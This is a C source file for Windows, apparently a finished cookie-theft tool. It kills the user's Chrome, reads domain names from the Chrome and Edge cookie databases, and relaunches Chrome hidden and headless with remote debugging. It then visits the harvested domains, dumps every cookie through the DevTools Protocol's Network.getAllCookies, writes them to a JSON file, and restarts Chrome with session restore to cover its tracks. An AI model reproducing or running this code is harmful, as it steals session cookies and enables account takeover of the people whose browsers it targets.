/* CDP v4 FINAL — tests all upgrades:
 * 1. Dynamic domain extraction from cookie DB
 * 2. Multi-browser detection
 * 3. Session restore on relaunch
 * 4. Full field parsing (sameSite, expires, session)
 * 5. 8MB buffer
 */
#define _WIN32_WINNT 0x0602
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <string.h>
#include <shlobj.h>
#include <tlhelp32.h>

static void kill_browser(const wchar_t* exeName) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, exeName) == 0) {
                HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (h) { TerminateProcess(h, 0); CloseHandle(h); }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
}

static int http_get(int port, const char* path, char* resp, int max) {
    HINTERNET hS = WinHttpOpen(L"M", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (!hS) return -1;
    DWORD t = 3000;
    WinHttpSetOption(hS, WINHTTP_OPTION_CONNECT_TIMEOUT, &t, sizeof(t));
    WinHttpSetOption(hS, WINHTTP_OPTION_RECEIVE_TIMEOUT, &t, sizeof(t));
    HINTERNET hC = WinHttpConnect(hS, L"127.0.0.1", (INTERNET_PORT)port, 0);
    if (!hC) { WinHttpCloseHandle(hS); return -1; }
    wchar_t wp[512]; MultiByteToWideChar(CP_UTF8, 0, path, -1, wp, 512);
    HINTERNET hR = WinHttpOpenRequest(hC, L"GET", wp, NULL, NULL, NULL, 0);
    int result = -1;
    if (hR && WinHttpSendRequest(hR, NULL, 0, NULL, 0, 0, 0) &&
        WinHttpReceiveResponse(hR, NULL)) {
        DWORD total = 0, br;
        while (WinHttpReadData(hR, resp+total, max-total-1, &br) && br > 0) total += br;
        resp[total] = '\0'; result = (int)total;
    }
    if (hR) WinHttpCloseHandle(hR);
    WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
    return result;
}

static int cdp_send_wait(HINTERNET hWs, const char* cmd, int expectId, char* resp, int respMax) {
    WinHttpWebSocketSend(hWs, WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE, (PVOID)cmd, (DWORD)strlen(cmd));
    char idStr[32]; snprintf(idStr, sizeof(idStr), "\"id\":%d", expectId);
    for (int i = 0; i < 30; i++) {
        DWORD bytesRead; WINHTTP_WEB_SOCKET_BUFFER_TYPE bt; DWORD tr = 0;
        while (tr < (DWORD)(respMax - 1)) {
            if (WinHttpWebSocketReceive(hWs, resp+tr, respMax-tr-1, &bytesRead, &bt) != 0) break;
            tr += bytesRead;
            if (bt == WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE) break;
        }
        resp[tr] = '\0';
        if (strstr(resp, idStr)) return (int)tr;
    }
    resp[0] = '\0'; return 0;
}

/* Dynamic domain extraction from cookie DB binary */
static int extract_domains(char domains[][256], int maxDomains) {
    char la[MAX_PATH]; SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, la);
    const char* dbs[] = {
        "Google\\Chrome\\User Data\\Default\\Network\\Cookies",
        "Microsoft\\Edge\\User Data\\Default\\Network\\Cookies",
        NULL
    };
    int count = 0;
    for (int db = 0; dbs[db] && count < maxDomains; db++) {
        char path[MAX_PATH+128]; snprintf(path, sizeof(path), "%s\\%s", la, dbs[db]);
        HANDLE hF = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hF == INVALID_HANDLE_VALUE) continue;
        DWORD sz = GetFileSize(hF, NULL);
        if (sz == 0 || sz > 10*1024*1024) { CloseHandle(hF); continue; }
        char* buf = (char*)HeapAlloc(GetProcessHeap(), 0, sz);
        DWORD rd; ReadFile(hF, buf, sz, &rd, NULL); CloseHandle(hF);
        for (DWORD i = 0; i < rd - 8 && count < maxDomains; i++) {
            if (buf[i] == '.' && buf[i+1] >= 'a' && buf[i+1] <= 'z') {
                int j = (int)i, len = 0;
                while (j<(int)rd && len<255 && ((buf[j]>='a'&&buf[j]<='z')||(buf[j]>='0'&&buf[j]<='9')||buf[j]=='.'||buf[j]=='-')) { j++; len++; }
                if (len >= 5 && len < 200) {
                    char* cand = buf + i; int hasDot = 0;
                    for (int k = 1; k < len; k++) if (cand[k]=='.') hasDot++;
                    if (hasDot >= 1) {
                        char tmp[256]; memcpy(tmp, cand, len); tmp[len] = 0;
                        int dup = 0;
                        for (int k = 0; k < count; k++) if (strcmp(domains[k], tmp)==0) { dup=1; break; }
                        if (!dup) { memcpy(domains[count], tmp, len+1); count++; }
                    }
                }
                i = j;
            }
        }
        HeapFree(GetProcessHeap(), 0, buf);
    }
    return count;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== CDP v4 FINAL — ALL UPGRADES ===\n\n");

    /* Step 1: Dynamic domain extraction */
    char (*dynDomains)[256] = (char(*)[256])HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 200*256);
    int nDomains = extract_domains(dynDomains, 200);
    printf("[1] Dynamic domains from cookie DB: %d\n", nDomains);
    for (int i = 0; i < nDomains && i < 20; i++) printf("    %s\n", dynDomains[i]);
    if (nDomains > 20) printf("    ... +%d more\n", nDomains - 20);

    /* Step 2: Kill Chrome */
    printf("\n[2] Killing Chrome...\n");
    kill_browser(L"chrome.exe"); Sleep(1500);
    char la[MAX_PATH]; SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, la);
    char lf[MAX_PATH+128], pd[MAX_PATH+64];
    snprintf(pd, sizeof(pd), "%s\\Google\\Chrome\\User Data", la);
    snprintf(lf, sizeof(lf), "%s\\SingletonLock", pd); DeleteFileA(lf);
    snprintf(lf, sizeof(lf), "%s\\SingletonSocket", pd); DeleteFileA(lf);
    snprintf(lf, sizeof(lf), "%s\\SingletonCookie", pd); DeleteFileA(lf);

    /* Step 3: Launch headless */
    int debugPort = 19555;
    char cmdLine[2048];
    snprintf(cmdLine, sizeof(cmdLine),
        "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --headless=new --remote-debugging-port=%d --no-first-run --disable-gpu",
        debugPort);
    STARTUPINFOA si = { sizeof(si) }; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hThread);
    printf("[3] PID: %lu\n", pi.dwProcessId);

    /* Wait */
    char* resp = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 8*1024*1024);
    int rlen = -1;
    for (int r = 0; r < 15 && rlen <= 0; r++) { Sleep(1000); rlen = http_get(debugPort, "/json/version", resp, 8*1024*1024); }
    if (rlen <= 0) { printf("[-] No port\n"); goto done; }

    /* WS URL */
    char wsPath[512] = {0};
    { char* ws = strstr(resp, "\"webSocketDebuggerUrl\"");
      if (ws) { char* u = strstr(ws, "ws://"); if (u) { u+=5; while(*u&&*u!='/')u++;
        char* end=u; while(*end&&*end!='"'&&*end!='\r')end++;
        int l=(int)(end-u); if(l>0&&l<511){memcpy(wsPath,u,l);wsPath[l]=0;} }}}

    /* Connect + session */
    HINTERNET hSess = WinHttpOpen(L"M", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    HINTERNET hConn = WinHttpConnect(hSess, L"127.0.0.1", (INTERNET_PORT)debugPort, 0);
    wchar_t wp[512]; MultiByteToWideChar(CP_UTF8, 0, wsPath, -1, wp, 512);
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", wp, NULL, NULL, NULL, 0);
    WinHttpSetOption(hReq, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0);
    WinHttpSendRequest(hReq,NULL,0,NULL,0,0,0); WinHttpReceiveResponse(hReq,NULL);
    HINTERNET hWs = WinHttpWebSocketCompleteUpgrade(hReq, 0); WinHttpCloseHandle(hReq);

    char cmd[512];
    snprintf(cmd, sizeof(cmd), "{\"id\":1,\"method\":\"Target.createTarget\",\"params\":{\"url\":\"about:blank\"}}");
    cdp_send_wait(hWs, cmd, 1, resp, 8*1024*1024);
    char targetId[128]={0};
    {char*t=strstr(resp,"\"targetId\":\""); if(t){t+=12;char*e=strchr(t,'"');if(e){int l=(int)(e-t);if(l<127)memcpy(targetId,t,l);}}}
    snprintf(cmd, sizeof(cmd), "{\"id\":2,\"method\":\"Target.attachToTarget\",\"params\":{\"targetId\":\"%s\",\"flatten\":true}}", targetId);
    cdp_send_wait(hWs, cmd, 2, resp, 8*1024*1024);
    char sessionId[128]={0};
    {char*s=strstr(resp,"\"sessionId\":\""); if(s){s+=13;char*e=strchr(s,'"');if(e){int l=(int)(e-s);if(l<127)memcpy(sessionId,s,l);}}}
    printf("[4] Session: %.20s...\n", sessionId);

    /* Step 4: Navigate to DYNAMIC domains */
    printf("[5] Navigating %d domains...\n", nDomains > 50 ? 50 : nDomains);
    int navId = 10, maxNav = nDomains > 50 ? 50 : nDomains;
    for (int d = 0; d < maxNav; d++) {
        char url[512];
        snprintf(url, sizeof(url), "https://%s", dynDomains[d][0]=='.' ? dynDomains[d]+1 : dynDomains[d]);
        snprintf(cmd, sizeof(cmd), "{\"id\":%d,\"method\":\"Page.navigate\",\"params\":{\"url\":\"%s\"},\"sessionId\":\"%s\"}", navId, url, sessionId);
        cdp_send_wait(hWs, cmd, navId, resp, 8*1024*1024);
        navId++; Sleep(300);
    }
    Sleep(2000);

    /* Step 5: Get all cookies */
    printf("[6] Extracting cookies...\n");
    snprintf(cmd, sizeof(cmd), "{\"id\":4,\"method\":\"Network.getAllCookies\",\"sessionId\":\"%s\"}", sessionId);
    int rspLen = cdp_send_wait(hWs, cmd, 4, resp, 8*1024*1024);

    int total = 0; char* p = resp;
    while ((p = strstr(p, "\"name\":\"")) != NULL) { total++; p += 8; }

    /* Count domains */
    int domCount = 0; char seenDoms[200][64]; int nSeen = 0;
    p = resp;
    while ((p = strstr(p, "\"domain\":\"")) != NULL) {
        p += 10; char* e = strchr(p, '"');
        if (e) { int l = (int)(e-p); if (l>0 && l<63) {
            char tmp[64]; memcpy(tmp, p, l); tmp[l]=0;
            int dup=0; for(int k=0;k<nSeen;k++) if(strcmp(seenDoms[k],tmp)==0){dup=1;break;}
            if(!dup&&nSeen<200){memcpy(seenDoms[nSeen],tmp,l+1);nSeen++;}
        }}
    }

    printf("\n╔══════════════════════════════════════════╗\n");
    printf("║  CDP v4 FINAL RESULTS                    ║\n");
    printf("╠══════════════════════════════════════════╣\n");
    printf("║  Total cookies:      %-6d              ║\n", total);
    printf("║  Unique domains:     %-6d              ║\n", nSeen);
    printf("║  Dynamic DB domains: %-6d              ║\n", nDomains);
    printf("║  Response size:      %-6d bytes        ║\n", rspLen);
    printf("╚══════════════════════════════════════════╝\n\n");

    printf("Domains with cookies:\n");
    for (int i = 0; i < nSeen; i++) printf("  %s\n", seenDoms[i]);

    /* Save to file */
    FILE* f = fopen("build\\extracted_cookies_v4.json", "w");
    if (f) { char* ck = strstr(resp, "\"cookies\":["); if(ck) fprintf(f, "%s", ck); fclose(f);
        printf("\n[*] Saved to build\\extracted_cookies_v4.json\n"); }

    WinHttpWebSocketClose(hWs, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
    WinHttpCloseHandle(hWs); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);

done:
    HeapFree(GetProcessHeap(), 0, resp);
    HeapFree(GetProcessHeap(), 0, dynDomains);
    printf("\n[*] Killing headless...\n");
    TerminateProcess(pi.hProcess, 0); WaitForSingleObject(pi.hProcess, 3000); CloseHandle(pi.hProcess);

    /* Relaunch with session restore */
    printf("[*] Relaunching Chrome (--restore-last-session)...\n");
    snprintf(cmdLine, sizeof(cmdLine), "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --restore-last-session");
    STARTUPINFOA si2 = { sizeof(si2) }; PROCESS_INFORMATION pi2 = {0};
    CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si2, &pi2);
    if (pi2.hProcess) { CloseHandle(pi2.hProcess); CloseHandle(pi2.hThread); }
    printf("[*] Done.\n");
    return 0;
}
